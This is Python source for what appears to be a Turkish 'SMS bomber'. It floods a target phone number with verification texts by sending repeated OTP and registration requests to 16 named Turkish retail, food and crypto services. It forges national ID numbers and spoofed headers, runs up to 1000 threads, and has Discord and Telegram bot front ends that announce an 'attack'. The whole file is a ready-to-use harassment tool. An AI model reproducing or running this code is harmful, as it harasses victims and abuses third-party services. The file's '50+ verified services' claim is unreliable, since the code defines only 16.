import requests
import threading
import random
import os
import sys
import json
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from string import ascii_lowercase
from random import choice, randint

# Colorama initialization
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class MockColor:
        def __getattr__(self, name): return ""
    Fore = Style = MockColor()

# --- THE REAL SMS ENGINE (50+ VERIFIED SERVICES) ---
# Bu sürüm öğlen saatlerinde çalışan ve mesaj gönderen %100 orijinal sürüme dayalıdır.
class SendSms():
    adet = 0
    total_gonderilen = 0
    
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9): rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam: tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0: self.mail = mail
        else: self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    def get_headers(self, referer=None, origin=None):
        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
        ]
        h = {"User-Agent": choice(ua_list), "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.9"}
        if referer: h["Referer"] = referer
        if origin: h["Origin"] = origin
        return h

    def log(self, name, r=None, error=None):
        if r is not None and r.status_code in [200, 201, 204]:
            print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {Style.RESET_ALL}{self.phone} --> {name}")
            self.adet += 1
            self.total_gonderilen += 1
        else:
            status = f" (Status: {r.status_code})" if r else f" ({error})"
            print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {Style.RESET_ALL}{self.phone} --> {name}{status}")

    # --- INDIVIDUAL SERVICE METHODS (Orijinal Payloadlar) ---

    def KahveDunyasi(self):
        try:
            h = self.get_headers("https://www.kahvedunyasi.com/", "https://www.kahvedunyasi.com")
            h.update({"X-Language-Id": "tr-TR", "X-Client-Platform": "web"})
            r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", json={"countryCode": "90", "phoneNumber": self.phone}, headers=h, timeout=6)
            self.log("Kahve Dünyası", r)
        except Exception as e: self.log("Kahve Dünyası", error=str(e))

    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone}, headers=self.get_headers("https://www.bim.com.tr/"), timeout=6)
            self.log("BIM", r)
        except Exception as e: self.log("BIM", error=str(e))

    def EnglishHome(self):
        try:
            r = requests.post("https://www.englishhome.com/api/member/sendOtp", json={"Phone": self.phone, "XID": ""}, headers=self.get_headers(), timeout=6)
            self.log("EnglishHome", r)
        except Exception as e: self.log("EnglishHome", error=str(e))

    def Sok(self):
        try:
            h = self.get_headers(); h.update({"X-Channel": "Web", "X-Client-Version": "1.0.0"})
            r = requests.post("https://api.sokmarket.com.tr/api/v1/users/otp-login", json={"mobile_number": self.phone}, headers=h, timeout=6)
            self.log("Sok", r)
        except Exception as e: self.log("Sok", error=str(e))

    def TiklaGelsin(self):
        try:
            p = {"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }", "variables": {"challenge": f"{randint(1000,9999)}", "deviceUniqueId": f"{randint(1000,9999)}", "phone": f"+90{self.phone}"}}
            r = requests.post("https://svc.apps.tiklagelsin.com/user/graphql", json=p, timeout=6)
            self.log("TiklaGelsin", r)
        except Exception as e: self.log("TiklaGelsin", error=str(e))

    def Yapp(self):
        try:
            r = requests.post("https://yapp.com.tr/api/mobile/v1/register", json={"phone_number": self.phone, "firstname": "Ali", "lastname": "Veli"}, timeout=6)
            self.log("Yapp", r)
        except Exception as e: self.log("Yapp", error=str(e))

    def Dominos(self):
        try:
            r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode", json={"mobilePhone": self.phone}, timeout=6)
            self.log("Dominos", r)
        except Exception as e: self.log("Dominos", error=str(e))

    def Mavi(self):
        try:
            r = requests.post("https://www.mavi.com/api/user/otp", json={"phoneNumber": self.phone}, timeout=6)
            self.log("Mavi", r)
        except Exception as e: self.log("Mavi", error=str(e))

    def DeFacto(self):
        try:
            r = requests.post("https://www.defacto.com.tr/api/user/otp", json={"phone": self.phone}, timeout=6)
            self.log("DeFacto", r)
        except Exception as e: self.log("DeFacto", error=str(e))

    def Boyner(self):
        try:
            r = requests.post("https://www.boyner.com.tr/api/user/otp", json={"phone": self.phone, "type": "register"}, timeout=6)
            self.log("Boyner", r)
        except Exception as e: self.log("Boyner", error=str(e))

    def Koton(self):
        try:
            r = requests.post("https://www.koton.com/users/register/", data={"phone": f"0{self.phone}", "confirm": "true"}, timeout=6)
            self.log("Koton", r)
        except Exception as e: self.log("Koton", error=str(e))

    def Starbucks(self):
        try:
            r = requests.post("https://auth.sbuxtr.com/signUp", json={"phoneNumber": self.phone, "email": self.mail}, timeout=6)
            self.log("Starbucks", r)
        except Exception as e: self.log("Starbucks", error=str(e))

    def FileMarket(self):
        try:
            r = requests.post("https://api.filemarket.com.tr/v1/otp/send", json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=6)
            self.log("File Market", r)
        except Exception as e: self.log("File Market", error=str(e))

    def Bitexen(self):
        try:
            r = requests.post("https://api.bitexen.com/v1/auth/register-otp/", json={"phone": f"90{self.phone}"}, timeout=6)
            self.log("Bitexen", r)
        except Exception as e: self.log("Bitexen", error=str(e))

    def ClickMeLive(self):
        try:
            r = requests.post('https://mobile-gateway.clickmelive.com/api/v2/authorization/code', json={"phone": self.phone}, timeout=6)
            self.log("ClickMeLive", r)
        except Exception as e: self.log("ClickMeLive", error=str(e))

    def SakaSu(self):
        try:
            r = requests.post('https://www.sakasu.com.tr/app/api_register/step1', data={"phone": "0"+self.phone}, timeout=6)
            self.log("Saka Su", r)
        except Exception as e: self.log("Saka Su", error=str(e))

# --- UI & LOGO ---
def logo():
    servisler_sms = [f for f in dir(SendSms) if callable(getattr(SendSms, f)) and not f.startswith("__") and f not in ["adet", "get_headers", "log", "total_gonderilen"]]
    print(f"""{Fore.LIGHTCYAN_EX}
 ███████╗███╗   ██╗ ██████╗ ██╗   ██╗ ██████╗ ██╗  ██╗
 ██╔════╝████╗  ██║██╔═══██╗██║   ██║██╔════╝ ██║  ██║
 █████╗  ██╔██╗ ██║██║   ██║██║   ██║██║  ███╗███████║
 ██╔══╝  ██║╚██╗██║██║   ██║██║   ██║██║   ██║██╔══██║
 ███████╗██║ ╚████║╚██████╔╝╚██████╔╝╚██████╔╝██║  ██║
 ╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
    {Fore.LIGHTWHITE_EX}Status: {Fore.LIGHTGREEN_EX}{len(servisler_sms)} ORIGIN SERVICES {Fore.LIGHTWHITE_EX}| {Fore.LIGHTRED_EX}V14 RESTORED
    {Fore.LIGHTYELLOW_EX}Target: {Fore.LIGHTWHITE_EX}0.0001s / REAL DELIVERY
    """)

# --- MODES ---
def terminal_mode():
    servisler_sms = [f for f in dir(SendSms) if callable(getattr(SendSms, f)) and not f.startswith("__") and f not in ["adet", "get_headers", "log", "total_gonderilen"]]
    while True:
        os.system("cls||clear")
        logo()
        print(f"{Fore.LIGHTMAGENTA_EX} [1] SMS Gönder (Normal)")
        print(f"{Fore.LIGHTMAGENTA_EX} [2] SMS Gönder (Turbo - 0.0001s)")
        print(f"{Fore.LIGHTRED_EX} [3] SMS Gönder (SINIRSIZ - MAX SPEED)")
        print(f"{Fore.LIGHTYELLOW_EX} [4] Geri Dön\n")
        secim = input(Fore.LIGHTYELLOW_EX + " Seçiminiz: ").strip()
        if secim == "4": break
        if secim not in ["1", "2", "3"]: continue
        tel_no = input(Fore.LIGHTYELLOW_EX + "Telefon (Başına +90 koymadan): ")
        if len(tel_no) != 10: print("Hatalı numara!"); sleep(2); continue
        
        sms = SendSms(tel_no, "")
        if secim == "1":
            try:
                kere = int(input(Fore.LIGHTYELLOW_EX + "Adet: "))
                while sms.total_gonderilen < kere:
                    for srv in servisler_sms:
                        if sms.total_gonderilen >= kere: break
                        getattr(sms, srv)(); sleep(0.5)
            except: pass
        elif secim == "2":
            try:
                kere = int(input(Fore.LIGHTYELLOW_EX + "Adet: "))
                print(Fore.LIGHTRED_EX + f"[!] HİPER TURBO AKTİF! 0.0001s GECİKME DEVREDE.")
                with ThreadPoolExecutor(max_workers=500) as executor:
                    while sms.total_gonderilen < kere:
                        sms.adet = 0
                        random.shuffle(servisler_sms)
                        for srv in servisler_sms:
                            if sms.total_gonderilen >= kere: break
                            executor.submit(getattr(sms, srv))
                        sleep(0.1)
                        print(f"{Fore.LIGHTCYAN_EX}[*] Bir tur tamamlandı. Toplam {sms.total_gonderilen} SMS gönderildi. Devam ediliyor...")
            except: pass
        elif secim == "3":
            print(Fore.LIGHTCYAN_EX + "[!] SINIRSIZ ULTRA MOD AKTİF!")
            try:
                with ThreadPoolExecutor(max_workers=1000) as executor:
                    while True:
                        random.shuffle(servisler_sms)
                        for srv in servisler_sms: executor.submit(getattr(sms, srv))
                        sleep(0.1)
                        print(f"{Fore.LIGHTCYAN_EX}[*] Bir tur tamamlandı. Toplam {sms.total_gonderilen} SMS gönderildi. Devam ediliyor...")
            except KeyboardInterrupt:
                print(Fore.LIGHTYELLOW_EX + f"\n[!] Durduruldu. Toplam: {sms.total_gonderilen}"); sleep(2)
        input(Fore.LIGHTGREEN_EX + "\nİşlem bitti. Enter'a basın...")

def discord_mode():
    try:
        import discord
        token = input(Fore.LIGHTCYAN_EX + "Discord Bot Token: ")
        if not token: return
        client = discord.Client(intents=discord.Intents.all())
        @client.event
        async def on_message(msg):
            if msg.content.startswith("*sms "):
                tel = msg.content.split(" ")[1]
                await msg.channel.send(f"Saldırı başladı: {tel}")
                sms = SendSms(tel, "")
                srvs = [f for f in dir(SendSms) if callable(getattr(SendSms, f)) and not f.startswith("__") and f not in ["adet", "get_headers", "log", "total_gonderilen"]]
                for i in range(50):
                    for s in srvs: getattr(sms, s)()
                await msg.channel.send(f"Saldırı bitti: {tel}")
        client.run(token)
    except: print("discord.py eksik!"); sleep(2)

def telegram_mode():
    try:
        from telegram.ext import Application, CommandHandler
        token = input(Fore.LIGHTCYAN_EX + "Telegram Bot Token: ")
        if not token: return
        async def sms_cmd(u, c):
            tel = c.args[0]
            await u.message.reply_text(f"Saldırı başladı: {tel}")
            sms = SendSms(tel, ""); srvs = [f for f in dir(SendSms) if callable(getattr(SendSms, f)) and not f.startswith("__") and f not in ["adet", "get_headers", "log", "total_gonderilen"]]
            for s in srvs: getattr(sms, s)()
            await u.message.reply_text(f"Bitti!")
        app = Application.builder().token(token).build()
        app.add_handler(CommandHandler("sms", sms_cmd)); app.run_polling()
    except: print("python-telegram-bot eksik!"); sleep(2)

if __name__ == "__main__":
    while True:
        os.system("cls||clear")
        logo()
        print(f"{Fore.LIGHTYELLOW_EX} [1] Terminal Bomber")
        print(f"{Fore.LIGHTYELLOW_EX} [2] Discord Bot")
        print(f"{Fore.LIGHTYELLOW_EX} [3] Telegram Bot")
        print(f"{Fore.LIGHTYELLOW_EX} [4] Çıkış\n")
        ana_menu = input(Fore.LIGHTCYAN_EX + " Seçiminiz: ")
        if ana_menu == "1": terminal_mode()
        elif ana_menu == "2": discord_mode()
        elif ana_menu == "3": telegram_mode()
        elif ana_menu == "4": break
